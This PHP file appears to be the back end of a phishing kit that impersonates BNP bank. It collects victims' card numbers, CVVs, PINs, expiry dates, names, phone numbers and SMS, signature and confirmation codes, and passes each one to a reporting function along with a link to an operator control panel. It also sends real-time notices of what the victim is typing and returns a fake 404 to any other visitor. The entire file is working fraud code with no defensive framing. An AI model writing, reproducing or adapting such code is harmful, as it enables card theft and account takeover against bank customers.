<?php 
session_start();
require '../config.php';

$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
} 
$panel_link = str_replace("home/post.php", "panel/ctr.php", "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");


 

if(isset($_POST['card'])){
call("/- BNP Log   -/
CARD: ".$_POST['card']."
NUMBER: ".$_POST['num']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}



if(isset($_POST['cvv'])){
call("/- BNP CC DETAILS -/
CVV: ".$_POST['cvv']."
PIN: ".$_POST['pin']."
-------------------------------------
PANEL LINK :". $panel_link );
return;
}


if(isset($_POST['name'])){
call("/- BNP CC INFO -/
Name: ".$_POST['name']."
EXP: ".$_POST['exp']."
-------------------------------------
PANEL LINK :". $panel_link );
return;
}

 
if(isset($_POST['otping'])){
call("BNP Notification
Entering code...
-------------------------------------
PANEL LINK :". $panel_link);
return;
}

 

if(isset($_POST['sign'])){
call("/- BNP SIGNATURE CODE -/
CODE: ".$_POST['sign']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}
    

if(isset($_POST['sms'])){
call("/- BNP SMS -/
CODE: ".$_POST['sms']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}

if(isset($_POST['number'])){
call("/- BNP NUMBER -/
Number: ".$_POST['number']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}
 
if(isset($_POST['confcode'])){
call("/- BNP CONFIRMATION CODE -/
CODE: ".$_POST['confcode']."
-------------------------------------
PANEL LINK :". $panel_link);
return;
}


if(isset($_POST['n_login'])){
    call("/- BNP NOTIFICATION -/
    Entering login information...
    -------------------------------------
    PANEL LINK :". $panel_link);
    return;
    }
    
    if(isset($_POST['n_sign'])){
    call("/- BNP NOTIFICATION -/
    Entering Signature code...
    -------------------------------------
    PANEL LINK :". $panel_link);
    return;
    }
    
    if(isset($_POST['n_conf'])){
    call("/- BNP NOTIFICATION -/
    Entering confirmation code...
    -------------------------------------
    PANEL LINK :". $panel_link);
    return;
    }
    
    if(isset($_POST['n_sign_auth'])){
    call("/- BNP NOTIFICATION -/
    Entering Signature authorization code...
    -------------------------------------
    PANEL LINK :". $panel_link);
    return;
    }
    
    if(isset($_POST['n_phone'])){
    call("/- BNP NOTIFICATION -/
    Entering phone number...
    -------------------------------------
    PANEL LINK :". $panel_link);
    return;
    }
    
    if(isset($_POST['n_sms'])){
    call("/- BNP NOTIFICATION -/
    Entering sms code...
    -------------------------------------
    PANEL LINK :". $panel_link);
    return;
    }
    
    
    if(isset($_POST['n_cc_details'])){
    call("/- BNP NOTIFICATION -/
    Entering cc details...
    -------------------------------------
    PANEL LINK :". $panel_link);
    return;
    }
    
    
    
    if(isset($_POST['n_cc'])){
    call("/- BNP NOTIFICATION -/
    Entering cc...
    -------------------------------------
    PANEL LINK :". $panel_link);
    return;
    }


header("HTTP/1.0 404 Not Found");

?>